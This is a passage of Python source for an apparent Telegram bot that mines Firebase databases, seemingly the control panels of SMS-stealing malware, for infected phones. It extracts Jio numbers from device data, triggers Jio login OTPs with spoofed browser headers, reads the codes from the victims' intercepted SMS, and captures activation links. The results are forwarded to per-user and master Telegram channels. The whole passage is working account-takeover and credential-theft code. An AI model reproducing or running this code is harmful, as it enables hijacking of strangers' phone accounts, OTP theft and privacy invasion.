            btn_markup = None

    destinations = set()
    if target_chat_id:
        destinations.add(target_chat_id)

    if user_id:
        user_storage = admin_manager.get_effective_storage_channel(user_id)
        if user_storage:
            destinations.add(user_storage)
        user_log = admin_manager.get_effective_log_channel(user_id)
        if user_log:
            destinations.add(user_log)

    # Master channels receive all captured victory cards across the entire bot
    master_log = admin_manager.get_master_log_channel()
    if master_log:
        destinations.add(master_log)
    master_storage = admin_manager.get_master_storage_channel()
    if master_storage:
        destinations.add(master_storage)

    for ch_id in destinations:
        try:
            res = await safe_telegram_call(
                bot.send_message,
                chat_id=ch_id,
                text=text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=btn_markup
            )
            if not res and btn_markup:
                await safe_telegram_call(
                    bot.send_message,
                    chat_id=ch_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True
                )
        except Exception as e:
            logger.debug(f"Failed to broadcast success to {ch_id}: {e}")

# Global fallback state references for backward compatibility
scanning = False
progress_msg_id = None
chat_id = None
last_progress_time = 0.0
active_scan_user = None
scan_stats = {
    "start_time": None,
    "total_panels": 0,
    "online_devices": 0,
    "total_targets": 0,
    "current_index": 0,
    "current_mobile": "",
    "success_count": 0,
    "failed_count": 0,
    "is_deep": True,
    "batch_times": [],
    "last_batch_idx": 0,
    "total_batches": 0,
    "recent_captures": []
}

def save_scan_state(user_id_or_data: Any, state_data: Optional[dict] = None):
    if state_data is None and isinstance(user_id_or_data, dict):
        state_data = user_id_or_data
        user_id = state_data.get("active_user", {}).get("user_id") if isinstance(state_data.get("active_user"), dict) else None
    else:
        user_id = user_id_or_data

    state_file = get_user_scan_state_file(user_id)
    tmp_path = state_file.with_suffix(f".tmp.{os.getpid()}.{time.time_ns()}")
    try:
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(state_data, f, indent=2)
        tmp_path.replace(state_file)
    except Exception as e:
        logger.debug(f"Failed to save scan state for user {user_id}: {e}")
        try:
            if tmp_path.exists():
                tmp_path.unlink()
        except Exception:
            pass

def load_scan_state(user_id: Optional[int] = None) -> Optional[dict]:
    state_file = get_user_scan_state_file(user_id)
    if state_file.exists():
        try:
            with open(state_file, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return None
    if user_id and admin_manager.is_super_admin(user_id) and SCAN_STATE_FILE.exists():
        try:
            with open(SCAN_STATE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return None
    return None

def clear_scan_state(user_id: Optional[int] = None):
    state_file = get_user_scan_state_file(user_id)
    if state_file.exists():
        try:
            state_file.unlink()
        except Exception:
            pass
    if not user_id or admin_manager.is_super_admin(user_id):
        if SCAN_STATE_FILE.exists():
            try:
                SCAN_STATE_FILE.unlink()
            except Exception:
                pass

# ============ CORE HELPERS ============
def is_admin(uid: Optional[int]) -> bool:
    if ALLOW_ALL_ADMINS:
        return True
    if uid is None:
        return False
    return uid in ADMIN_USER_IDS

def get_current_time() -> Tuple[str, str]:
    utc = datetime.now(timezone.utc)
    local_time = utc + timedelta(hours=TIMEZONE_OFFSET_HOURS)
    return local_time.strftime("%Y-%m-%d"), local_time.strftime("%I:%M:%S %p")

FIREBASE_URL_REGEX = re.compile(
    r'(?:https?://)?([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.(?:firebaseio\.com|firebasedatabase\.app))(?:/[^\s|,:]*)?',
    re.IGNORECASE
)

IGNORABLE_KEY_WORDS = {
    "ok", "working", "active", "online", "tested", "none", "null", 
    "false", "true", "yes", "no", "dead", "live", "fail", "failed",
    "success", "good", "bad", "link", "panel", "firebase", "hit", "hits"
}

def clean_url(url: str) -> str:
    if not url:
        return ""
    m = FIREBASE_URL_REGEX.search(str(url).strip().lstrip("\ufeff"))
    if not m:
        return ""
    return f"https://{m.group(1).lower()}"

def clean_key(key: str) -> str:
    if not key:
        return ""
    key = str(key).strip(" ,|\t\r\n\"':;()[]{}").replace(" ", "")
    if not key or key.lower().startswith("http") or "firebase" in key.lower():
        return ""
    if key.lower() in IGNORABLE_KEY_WORDS:
        return ""
    if len(key) < 6 or len(key) > 128:
        return ""
    if not re.match(r'^[a-zA-Z0-9_\-\.=]+$', key):
        return ""
    return key

def extract_panels_from_text(text: str) -> List[Tuple[str, str]]:
    if not text:
        return []
    extracted: List[Tuple[str, str]] = []
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        matches = list(FIREBASE_URL_REGEX.finditer(line))
        if not matches:
            continue
        for idx, m in enumerate(matches):
            host = m.group(1).lower()
            canon_url = f"https://{host}"
            start_after = m.end()
            end_before = matches[idx + 1].start() if idx + 1 < len(matches) else len(line)
            segment = line[start_after:end_before].strip()
            key = ""
            if segment:
                cleaned_seg = segment.lstrip(" ,|:\t-").strip(" \r\n\t\"'()[]{}")
                first_token = re.split(r"[\s|,;]+", cleaned_seg)[0] if cleaned_seg else ""
                key = clean_key(first_token)
            extracted.append((canon_url, key))
    return extracted

_PANELS_CACHE: Dict[str, Tuple[float, List[Tuple[str, str]]]] = {}

def load_panels(user_id: Optional[int] = None) -> List[Tuple[str, str]]:
    pfile = get_user_panels_file(user_id)
    if not pfile.exists() or pfile.stat().st_size == 0:
        if (not user_id or admin_manager.is_super_admin(user_id)) and PANELS_FILE.exists() and PANELS_FILE.stat().st_size > 0:
            pfile = PANELS_FILE
        else:
            return []

    cache_key = str(pfile.resolve())
    try:
        cur_mtime = pfile.stat().st_mtime
    except Exception:
        cur_mtime = 0.0

    if cache_key in _PANELS_CACHE:
        cached_mtime, cached_data = _PANELS_CACHE[cache_key]
        if cached_mtime == cur_mtime:
            return list(cached_data)

    panels_map: Dict[str, str] = OrderedDict()
    with open(pfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            extracted = extract_panels_from_text(line)
            for u, k in extracted:
                if u not in panels_map or (not panels_map[u] and k):
                    panels_map[u] = k
    res = [(u, k) for u, k in panels_map.items()]
    _PANELS_CACHE[cache_key] = (cur_mtime, res)
    return list(res)

def save_panels(panels: List[Tuple[str, str]], user_id: Optional[int] = None):
    pfile = get_user_panels_file(user_id)
    tmp_file = pfile.with_suffix(f".tmp.{os.getpid()}.{time.time_ns()}")
    try:
        # Sort alphabetically A-Z by panel URL for clean organization, easy search, and reliable deduplication
        sorted_panels = sorted(panels, key=lambda x: x[0].lower())
        with open(tmp_file, "w", encoding="utf-8") as f:
            for u, k in sorted_panels:
                if k:
                    f.write(f"{u}|{k}\n")
                else:
                    f.write(f"{u}\n")
        tmp_file.replace(pfile)
        _PANELS_CACHE.pop(str(pfile.resolve()), None)
        _PANELS_CACHE.pop(str(PANELS_FILE.resolve()), None)
    except Exception as e:
        logger.debug(f"save_panels failed for user {user_id}: {e}")
        try:
            if tmp_file.exists():
                tmp_file.unlink()
        except Exception:
            pass

    if user_id and admin_manager.is_super_admin(user_id) and pfile != PANELS_FILE:
        tmp_root = PANELS_FILE.with_suffix(f".tmp.{os.getpid()}.{time.time_ns()}")
        try:
            with open(tmp_root, "w", encoding="utf-8") as f_root:
                for u, k in panels:
                    if k:
                        f_root.write(f"{u}|{k}\n")
                    else:
                        f_root.write(f"{u}\n")
            tmp_root.replace(PANELS_FILE)
        except Exception:
            try:
                if tmp_root.exists():
                    tmp_root.unlink()
            except Exception:
                pass

def append_panels(new_entries: List[Tuple[str, str]], user_id: Optional[int] = None) -> Tuple[int, int, int]:
    existing = load_panels(user_id)
    url_map: Dict[str, str] = OrderedDict()
    for u, k in existing:
        url_map[u] = k
    added = 0
    duplicates = 0
    for u, k in new_entries:
        u_clean = clean_url(u)
        if not u_clean:
            continue
        k_clean = clean_key(k)
        if u_clean not in url_map:
            url_map[u_clean] = k_clean
            added += 1
        else:
            duplicates += 1
            if not url_map[u_clean] and k_clean:
                url_map[u_clean] = k_clean
    merged = [(u, k) for u, k in url_map.items()]
    save_panels(merged, user_id)
    return added, duplicates, len(merged)


async def restore_workspace_from_storage(bot, user_id: Optional[int] = None) -> bool:
    """
    Restores the complete workspace (panels, lifetime activation URLs, and processed numbers)
    from the user's private storage channel. This guarantees zero duplicate links across cloud restarts.
    """
    if not user_id:
        return False
    try:
        storage_ch = admin_manager.get_effective_storage_channel(user_id)
        if not storage_ch:
            return False
        user_pfile = get_user_panels_file(user_id)
        user_lfile = get_user_links_file(user_id)
        user_proc_file = get_user_processed_file(user_id)
        user_settings = load_user_settings(user_id)

        chat = await bot.get_chat(storage_ch)
        pinned = getattr(chat, "pinned_message", None)
        target_doc = None

        if pinned and pinned.document:
            target_doc = pinned.document
        elif user_settings.get("backup_file_id"):
            target_fid = user_settings.get("backup_file_id")
            try:
                target_doc = await bot.get_file(target_fid)
            except Exception:
                target_doc = None

        restored_any = False
        if target_doc:
            doc_name = (getattr(target_doc, "file_name", "") or "").lower()
            fid = getattr(target_doc, "file_id", None)
            if fid:
                tg_file = await bot.get_file(fid)
                if "backup" in doc_name or doc_name.endswith(".json"):
                    tmp_b = user_proc_file.with_suffix(f".tmp_res_{int(time.time())}.json")
                    await tg_file.download_to_drive(tmp_b)
                    try:
                        with open(tmp_b, "r", encoding="utf-8") as f:
                            bdata = json.load(f)
                        b_panels = bdata.get("panels", [])
                        if b_panels:
                            save_panels(b_panels, user_id)
                            restored_any = True
                        b_urls = bdata.get("lifetime_urls", [])
                        if b_urls:
                            with open(user_lfile, "a", encoding="utf-8") as lf:
                                for u in b_urls:
                                    u_clean = str(u).strip().rstrip(".\"';")
                                    if u_clean:
                                        register_captured_url(u_clean)
                                        lf.write(u_clean + "\n")
                            restored_any = True
                        b_proc = bdata.get("processed_numbers", {})
                        if b_proc and isinstance(b_proc, dict):
                            with _PROCESSED_LOCK:
                                for k, v in b_proc.items():
                                    _PROCESSED_CACHE[k] = v
                                    if v.get("url"):
                                        u_str = str(v["url"]).strip()
                                        _LIFETIME_CAPTURED_URLS.add(u_str)
                                        tok = extract_link_token(u_str)
                                        if tok:
                                            _LIFETIME_CAPTURED_TOKENS.add(tok)
                            save_processed_numbers(user_id, b_proc)
                            restored_any = True
                        logger.info(f"🛡️ Restored full workspace for user {user_id} from cloud backup ({len(b_panels)} panels, {len(b_urls)} URLs, {len(b_proc)} numbers)!")
                    finally:
                        if tmp_b.exists():
                            try:
                                tmp_b.unlink()
                            except Exception:
                                pass
                elif "panel" in doc_name or doc_name.endswith(".txt"):
                    await tg_file.download_to_drive(user_pfile)
                    if admin_manager.is_super_admin(user_id) and user_pfile != PANELS_FILE:
                        try:
                            shutil.copy2(user_pfile, PANELS_FILE)
                        except Exception:
                            pass
                    restored_any = True
                    logger.info(f"Auto-restored panels.txt for user {user_id} from storage channel pinned message!")

        # Also fallback to panels_file_id if panels file doesn't exist yet
        if not user_pfile.exists() or user_pfile.stat().st_size == 0:
            cached_fid = user_settings.get("panels_file_id")
            if cached_fid:
                try:
                    f = await bot.get_file(cached_fid)
                    await f.download_to_drive(user_pfile)
                    restored_any = True
                except Exception:
                    pass

        return restored_any
    except Exception as e:
        logger.debug(f"Could not auto-restore workspace for user {user_id} from storage channel: {e}")
        return False

async def restore_panels_from_storage(bot, user_id: Optional[int] = None) -> bool:
    return await restore_workspace_from_storage(bot, user_id)

async def backup_workspace_to_storage(bot, user_id: Optional[int] = None) -> bool:
    """
    Creates an atomic consolidated workspace backup (panels, lifetime URLs, and processed numbers)
    and pins it in the user's storage channel.
    """
    if not user_id:
        return False
    try:
        storage_ch = admin_manager.get_effective_storage_channel(user_id)
        if not storage_ch:
            return False

        user_lfile = get_user_links_file(user_id)
        panels = load_panels(user_id)

        user_urls = set()
        if user_lfile.exists():
            try:
                for line in user_lfile.read_text(encoding="utf-8", errors="ignore").splitlines():
                    u = line.strip().rstrip(".\"';")
                    if u.startswith("http"):
                        user_urls.add(u)
            except Exception:
                pass

        with _PROCESSED_LOCK:
            user_urls.update(_LIFETIME_CAPTURED_URLS)

        proc_data = load_processed_numbers(user_id)
        with _PROCESSED_LOCK:
            for k, v in _PROCESSED_CACHE.items():
                if v.get("status") in ("success", "duplicate_unredeemed"):
                    proc_data[k] = v

        backup_payload = {
            "timestamp": time.time(),
            "date": get_current_time()[0],
            "panels": panels,
            "lifetime_urls": list(user_urls),
            "processed_numbers": proc_data
        }

        backup_file = get_user_data_dir(user_id) / "gemini_workspace_backup.json"
        with open(backup_file, "w", encoding="utf-8") as f:
            json.dump(backup_payload, f, indent=2)

        with open(backup_file, "rb") as f:
            sent_msg = await safe_telegram_call(
                bot.send_document,
                chat_id=storage_ch,
                document=f,
                filename="gemini_workspace_backup.json",
                caption=(
                    f"🔒 <b>Gemini Workspace Cloud Backup</b>\n\n"
                    f"• <b>Panels:</b> <code>{len(panels)}</code>\n"
                    f"• <b>Protected Lifetime URLs:</b> <code>{len(user_urls)}</code>\n"
                    f"• <b>Processed Numbers:</b> <code>{len(proc_data)}</code>\n"
                    f"🕒 <i>Sync Time: {get_current_time()[1]} IST</i>\n"
                    f"💡 <i>Auto-restores on cloud restart to prevent duplicate links 100%!</i>"
                ),
                parse_mode=ParseMode.HTML
            )

        if sent_msg:
            try:
                await safe_telegram_call(bot.pin_chat_message, chat_id=storage_ch, message_id=sent_msg.message_id, disable_notification=True)
            except Exception:
                pass
            if sent_msg.document:
                settings = load_user_settings(user_id)
                settings["backup_file_id"] = sent_msg.document.file_id
                save_user_settings(user_id, settings)

        return True
    except Exception as e:
        logger.debug(f"Could not backup workspace to storage channel for user {user_id}: {e}")
        return False

def fb_session() -> requests.Session:
    s = requests.Session()
    retries = Retry(total=1, backoff_factor=0.2, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retries)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    s.headers.update({
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    })
    return s

JIO_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"
]

def jio_session() -> requests.Session:
    s = requests.Session()
    retries = Retry(total=2, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=retries)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    ua = random.choice(JIO_USER_AGENTS)
    s.headers.update({
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
        "Sec-Ch-Ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Requested-With": "XMLHttpRequest",
        "X-Client-Id": "myjio_web_portal",
    })
    return s

class PayloadTooLargeError(Exception):
    """Raised when a Firebase endpoint response exceeds container memory limits."""
    pass

MAX_FB_PAYLOAD_BYTES = 2 * 1024 * 1024  # 2MB cap to protect container RAM (153MB limit)

def fb_get(s: requests.Session, url: str, key: str, path: str, params: Optional[dict] = None, raise_on_too_large: bool = False, max_bytes: int = MAX_FB_PAYLOAD_BYTES) -> Any:
    q = {}
    if key:
        q["auth"] = key
    if params:
        q.update(params)
    clean_path = path.strip("/")
    endpoint = f"{url}/{clean_path}.json" if clean_path else f"{url}/.json"
    r = None
    try:
        r = s.get(endpoint, params=q, timeout=REQUEST_TIMEOUT, stream=True)
        if r.status_code == 200:
            cl = r.headers.get("content-length")
            if cl and cl.isdigit() and int(cl) > max_bytes:
                logger.warning(f"Payload from {endpoint} too large ({cl} bytes > {max_bytes} limit). Aborting to prevent OOM.")
                if raise_on_too_large:
                    raise PayloadTooLargeError(f"Content-Length {cl} > {max_bytes}")
                return {}

            chunks = []
            cur_bytes = 0
            for chunk in r.iter_content(chunk_size=32768):
                if not chunk:
                    continue
                cur_bytes += len(chunk)
                if cur_bytes > max_bytes:
                    logger.warning(f"Payload from {endpoint} exceeded limit of {max_bytes} bytes while streaming. Aborting to prevent OOM.")
                    if raise_on_too_large:
                        raise PayloadTooLargeError(f"Stream {cur_bytes} > {max_bytes}")
                    return {}
                chunks.append(chunk)

            raw_data = b"".join(chunks)
            del chunks
            if not raw_data:
                return {}
            return json.loads(raw_data.decode("utf-8", errors="replace"))
        return {}
    except PayloadTooLargeError:
        raise
    except Exception as e:
        logger.debug(f"fb_get error for {endpoint}: {e}")
        return {}
    finally:
        if r is not None:
            try:
                r.close()
            except Exception:
                pass

def get_device_battery(dev_data: Any) -> Tuple[Optional[int], bool]:
    """Extracts (battery_percentage, is_charging) from device metadata for priority queuing."""
    if not isinstance(dev_data, dict):
        return None, False

    candidates = [dev_data]
    for sub_k in ("info", "deviceInfo", "device_info", "details", "client", "system", "batteryInfo"):
        sub = dev_data.get(sub_k)
        if isinstance(sub, dict):
            candidates.append(sub)

    battery = None
    charging = False
    for c in candidates:
        for bk in ("battery", "batteryLevel", "battery_level", "power", "batteryPct", "level"):
            val = c.get(bk)
            if val is not None:
                try:
                    b_str = str(val).replace("%", "").strip()
                    b_int = int(float(b_str))
                    if 0 <= b_int <= 100:
                        battery = b_int
                        break
                except Exception:
                    pass
        for ck in ("charging", "isCharging", "is_charging", "plugged"):
            val = c.get(ck)
            if val is not None:
                if val is True or str(val).strip().lower() in ("true", "1", "yes", "charging"):
                    charging = True
                    break
        if battery is not None:
            break
    return battery, charging

def is_device_online(data: Any) -> bool:
    """Robust parser for online device status across multiple Firebase schemas, nested metadata & heartbeats."""
    if not isinstance(data, dict):
        return False

    candidates = [data]
    for sub_k in ("info", "deviceInfo", "device_info", "details", "client", "system"):
        sub = data.get(sub_k)
        if isinstance(sub, dict):
            candidates.append(sub)

    for c in candidates:
        raw_status = (
            c.get("status")
            if c.get("status") is not None
            else c.get("isOnline")
            if c.get("isOnline") is not None
            else c.get("online")
            if c.get("online") is not None
            else c.get("state")
            if c.get("state") is not None
            else c.get("connected")
        )
        if raw_status is not None:
            if raw_status is True or raw_status == 1 or raw_status == "1" or str(raw_status).strip().lower() in ("online", "true", "active", "connected", "1"):
                return True
            if raw_status is False or raw_status == 0 or raw_status == "0" or str(raw_status).strip().lower() in ("offline", "false", "disconnected", "0"):
                return False

    # Timestamp recency fallback (with clock skew tolerance: up to 3 min future skew and 15 min past)
    now = time.time()
    for c in candidates:
        for ts_field in ("timestamp", "last_seen", "lastSeen", "lastOnline", "lastMessageTime", "time", "updated_at"):
            val = c.get(ts_field)
            if isinstance(val, dict):
                val = val.get("timestamp") or val.get("time")
            if val:
                try:
                    t_float = float(val)
                    if t_float > 1e12:
                        t_float /= 1000.0
                    diff = now - t_float
                    if -180 <= diff <= 900:
                        return True
                except Exception:
                    pass
    return False

def get_message_timestamp(item: dict) -> Optional[float]:
    """Extracts timestamp as epoch seconds from SMS item."""
    for k in ("timestamp", "time", "date", "date_sent"):
        val = item.get(k)
        if val:
            try:
                t = float(val)
                if t > 1e12:
                    t /= 1000.0
                return t
            except (ValueError, TypeError):
                pass
    return None

def get_messages(
    s: requests.Session,
    url: str,
    key: str,
    device: str,
    limit: int,
    dev_data: Optional[dict] = None,
    base_path: str = "clients"
) -> Dict[str, dict]:
    """
    Deep search for recent messages across all Firebase layouts:
    1. Dedicated paths (/messages/{did}, /sms/{did}, /{base_path}/{did}/messages)
    2. Shallow keys for large trees
    3. Live fetch or embedded SMS inside device objects
    """
    clean_base = base_path.strip("/") if base_path else "clients"
    cache_key = f"{clean_url(url)}:{device}"
    cached_path = get_cached_device_path(cache_key)

    if cached_path:
        try:
            data = fb_get(s, url, key, cached_path, {"orderBy": '"$key"', "limitToLast": limit})
            if isinstance(data, dict) and data:
                return {str(k): v for k, v in data.items() if isinstance(v, dict)}
            data = fb_get(s, url, key, cached_path)
            if isinstance(data, dict) and data:
                items = list(data.items())
                if len(items) > limit:
                    items = items[-limit:]
                return {str(k): v for k, v in items if isinstance(v, dict)}
        except Exception:
            pass

    candidate_paths = [
        f"messages/{device}",
        f"sms/{device}",
        f"{clean_base}/{device}/messages",
        f"{clean_base}/{device}/sms",
        f"{clean_base}/{device}/smsList",
        f"{clean_base}/{device}/sms_list",
        f"clients/{device}/messages",
        f"clients/{device}/sms",
        f"devices/{device}/messages",
        f"devices/{device}/sms",
        f"all_sms/{device}",
        f"smsList/{device}",
        f"sms_list/{device}"
    ]

    seen_paths = set()
    for path in candidate_paths:
        p_clean = path.strip("/")
        if not p_clean or p_clean in seen_paths:
            continue
        seen_paths.add(p_clean)

        try:
            # 1. Try limitToLast
            data = fb_get(s, url, key, p_clean, {"orderBy": '"$key"', "limitToLast": limit})
            if isinstance(data, dict) and data:
                set_cached_device_path(cache_key, p_clean)
                return {str(k): v for k, v in data.items() if isinstance(v, dict)}

            # If node does not exist in Firebase (null), skip steps 2 & 3
            if data is None:
                continue

            # 2. Try shallow keys if ordered query fails
            shallow_data = fb_get(s, url, key, p_clean, {"shallow": "true"})
            if isinstance(shallow_data, dict) and shallow_data:
                def _sk(k_str):
                    try:
                        return (0, int(k_str))
                    except ValueError:
                        return (1, str(k_str))
                sorted_keys = sorted(shallow_data.keys(), key=_sk)[-limit:]
                fetched = {}
                for k in sorted_keys:
                    msg_item = fb_get(s, url, key, f"{p_clean}/{k}")
                    if isinstance(msg_item, dict):
                        fetched[str(k)] = msg_item
                if fetched:
                    set_cached_device_path(cache_key, p_clean)
                    return fetched

            # 3. Try standard get without parameters
            data = fb_get(s, url, key, p_clean)
            if isinstance(data, dict) and data:
                items = list(data.items())
                if len(items) > limit:
                    items = items[-limit:]
                set_cached_device_path(cache_key, p_clean)
                return {str(k): v for k, v in items if isinstance(v, dict)}
            if isinstance(data, dict):
                set_cached_device_path(cache_key, p_clean)
                return {}
        except Exception as e:
            logger.debug(f"Error getting messages from {url}/{p_clean}: {e}")
            continue

    # 4. Fallback: Check embedded messages inside device object (fetch live if needed)
    container_dict = dev_data
    if not container_dict or not isinstance(container_dict, dict):
        live_dev = fb_get(s, url, key, f"{clean_base}/{device}")
        if isinstance(live_dev, dict):
            container_dict = live_dev

    if container_dict and isinstance(container_dict, dict):
        for msg_key in ("messages", "sms", "data", "chats", "sms_list", "smsList", "inbox"):
            container = container_dict.get(msg_key)
            if isinstance(container, dict):
                items = list(container.items())
                if len(items) > limit:
                    items = items[-limit:]
                return {str(k): v for k, v in items if isinstance(v, dict)}
            elif isinstance(container, list):
                result = {}
                for idx, m in enumerate(container[-limit:]):
                    if isinstance(m, dict):
                        result[f"idx_{idx}"] = m
                if result:
                    return result

    return {}

def is_valid_phone(num: str) -> bool:
    """Validates phone number, discarding toll-free, dummy, and repetitive sequence numbers."""
    if not num:
        return False
    digits = re.sub(r"\D", "", str(num))
    if len(digits) == 12 and digits.startswith("91") and digits[2] in "6789":
        digits = digits[2:]
    elif len(digits) == 11 and digits.startswith("0") and digits[1] in "6789":
        digits = digits[1:]

    if len(digits) == 10 and digits[0] in "6789":
        # Discard toll-free / helpline prefixes
        if digits.startswith(("800", "1800", "1860", "1900")):
            return False
        # Discard dummy / repetitive sequences (e.g. 9999999999, 1234567890)
        if len(set(digits)) <= 2:
            return False
        if digits in ("1234567890", "9876543210", "9999999999", "8888888888", "7777777777", "6666666666"):
            return False
        return True
    return False

def extract_mobile(val: Any) -> Optional[str]:
    if not val:
        return None
    digits = re.sub(r"\D", "", str(val))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    elif len(digits) == 11 and digits.startswith("0"):
        digits = digits[1:]
    if re.fullmatch(r"[6-9]\d{9}", digits) and is_valid_phone(digits):
        return digits
    return None

def extract_numbers_from_text(text: Any) -> Set[str]:
    found = set()
    if not text:
        return found
    for match in PHONE_PATTERN.finditer(str(text)):
        m = extract_mobile(match.group(1))
        if m:
            found.add(m)
    return found

def is_jio_carrier(carrier_text: str) -> bool:
    if not carrier_text:
        return False
    cl = str(carrier_text).lower()
    return "jio" in cl or "reliance" in cl

def extract_device_numbers(dev_data: Any) -> Tuple[Set[str], Set[str]]:
    """
    Extracts (all_numbers, jio_numbers) from device metadata.
    Searches root and nested structures (info, deviceInfo, details, simInfo, sims).
    """
    found = set()
    jio_found = set()
    if not isinstance(dev_data, dict):
        return found, jio_found

    candidates = [dev_data]
    for sub_k in ("info", "deviceInfo", "device_info", "details", "system"):
        sub = dev_data.get(sub_k)
        if isinstance(sub, dict):
            candidates.append(sub)

    for c in candidates:
        dev_carrier = str(c.get("network") or c.get("simOperator") or c.get("carrier") or c.get("operator") or c.get("networkOperatorName") or "")
        carrier_is_jio = is_jio_carrier(dev_carrier)

        # Direct phone keys
        for k in (
            "phoneNumber", "phone", "phone_number", "mobNo", "mobile", "number",
            "sim1", "sim_1", "sim2", "sim_2", "simNumber", "sim1Number", "sim2Number",
            "sim_number", "line1Number", "line1_number", "telephone"
        ):
            val = c.get(k)
            if val:
                m = extract_mobile(val)
                if m:
                    found.add(m)
                    if carrier_is_jio:
                        jio_found.add(m)

        # sims / simInfo containers
        for sim_key in ("sims", "simInfo", "sim_info", "simList", "sim_list"):
            sim_container = c.get(sim_key)
            if isinstance(sim_container, str):
                try:
                    sim_container = json.loads(sim_container)
                except Exception:
                    pass
            if isinstance(sim_container, list):
                for s in sim_container:
                    if isinstance(s, dict):
                        c_name = str(s.get("carrierName") or s.get("carrier") or s.get("operator") or s.get("simOperatorName") or "")
                        for sk in ("phoneNumber", "phone", "number", "simNumber", "line1Number"):
                            m = extract_mobile(s.get(sk))
                            if m:
                                found.add(m)
                                if is_jio_carrier(c_name) or carrier_is_jio:
                                    jio_found.add(m)
            elif isinstance(sim_container, dict):
                for s in sim_container.values():
                    if isinstance(s, dict):
                        c_name = str(s.get("carrierName") or s.get("carrier") or s.get("operator") or s.get("simOperatorName") or "")
                        for sk in ("phoneNumber", "phone", "number", "simNumber", "line1Number", "sim1", "sim2"):
                            m = extract_mobile(s.get(sk))
                            if m:
                                found.add(m)
                                if is_jio_carrier(c_name) or carrier_is_jio:
                                    jio_found.add(m)

    return found, jio_found

def extract_message_numbers(messages: Any) -> Tuple[Set[str], Set[str]]:
    """
    Extracts (all_numbers, jio_numbers) strictly from message metadata or explicit subscriber alerts.
    Does NOT extract arbitrary numbers from SMS bodies to prevent phantom targets.
    """
    found = set()
    jio_found = set()
    if not isinstance(messages, dict):
        return found, jio_found

    for item in messages.values():
        if not isinstance(item, dict):
            continue
        for k in ("phoneNumber", "phone", "to", "recipient", "simInfo"):
            val = item.get(k)
            if isinstance(val, dict):
                m = extract_mobile(val.get("phoneNumber"))
                if m:
                    found.add(m)
            elif val:
                m = extract_mobile(val)
                if m:
                    found.add(m)

        text = str(item.get("message") or item.get("body") or item.get("msg") or item.get("text") or "")
        for pat in JIO_NUMBER_PATTERNS:
            for match in pat.finditer(text):
                m = extract_mobile(match.group(1))
                if m:
                    found.add(m)
                    jio_found.add(m)

    return found, jio_found

def extract_otp(text: str, sender: str = "") -> Optional[str]:
    if not text:
        return None
    text_str = str(text)
    combined = f"{sender} {text_str}".lower()

    # Must contain authentication or carrier keywords
    is_relevant = any(k in combined for k in ("otp", "code", "pin", "password", "verif", "jio", "login", "myjio"))
    if not is_relevant:
        return None

    # 1. Dash-separated 6-digit verification code (e.g. 123-456)
    m_dash = re.search(r"\b([0-9]{3})-([0-9]{3})\b", text_str)
    if m_dash:
        return f"{m_dash.group(1)}{m_dash.group(2)}"

    # 2. Specific patterns with keywords
    for p in OTP_PATTERNS[1:5]:
        m = p.search(text_str)
        if m:
            return m.group(1)

    # 3. Generic 6-digit fallback if relevance confirmed
    m = OTP_PATTERNS[5].search(text_str)
    if m:
        return m.group(1)

    return None

def extract_activation_url_from_text(raw_text: str) -> Optional[str]:
    if not raw_text:
        return None
    cleaned = html.unescape(str(raw_text))
    cleaned = cleaned.replace("\\/", "/").replace(r"\/", "/")
    for _ in range(4):
        cleaned = unquote(cleaned)

    # Check for accounts.google.com with continue parameter
    if "continue=" in cleaned:
        try:
            parsed = urlparse(cleaned)
            qs = parse_qs(parsed.query)
            if "continue" in qs and qs["continue"]:
                continue_url = unquote(qs["continue"][0])
                m = ACTIVATION_PATTERN.search(continue_url)
                if m:
                    return m.group(0).rstrip(".\"';")
        except Exception:
            pass

    match = ACTIVATION_PATTERN.search(cleaned)
    if match:
        return match.group(0).rstrip(".\"';")
    return None

def send_otp(s: requests.Session, mobile: str) -> Tuple[bool, int]:
    try:
        payload = {
            "mobileNumber": mobile,
            "loginFlowType": "MOBILE",
            "alternateNumber": ""
        }
        r = s.post(SEND_OTP_URL, json=payload, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            try:
                data = r.json()
                code = str(data.get("responseCode") or data.get("statusCode") or data.get("status") or "")
